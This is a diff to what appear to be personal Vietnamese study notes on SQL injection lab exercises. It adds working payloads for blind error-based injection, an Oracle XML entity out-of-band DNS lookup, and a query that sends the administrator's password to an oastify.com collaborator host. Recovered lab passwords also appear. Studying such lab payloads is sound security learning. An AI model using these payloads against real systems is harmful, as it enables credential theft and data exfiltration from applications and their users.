@@ -116,7 +116,13 @@ LƯU Ý : Dùng tab Intruder , Chỉnh attack type thành Cluster Bomb để đ�
 => 20 kí tự
 pass : lfpv794meqaknkvo4u1n
 
-SQL Injection Blind error (ép kiểu để in ra lỗi)
+#SQL Injection Blind error (ép kiểu để in ra lỗi)
 TrackingId=' and 1=cast((select password from users limit 1) as int) -- 
 lưu ý : 'and 1=cast'
 pass: llu4cw6dkradtve1w05c
+
+#DNS lookup
+'+||+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//2svizq7knmrush7t6ar1bkk1osukin6c.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual -- 
+
+#DNS get data 
+' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.rwr73fb9rbvjw6biazvqf9oqshyjm9ay.oastify.com/"> %remote;]>'),'/l') FROM dual -- -
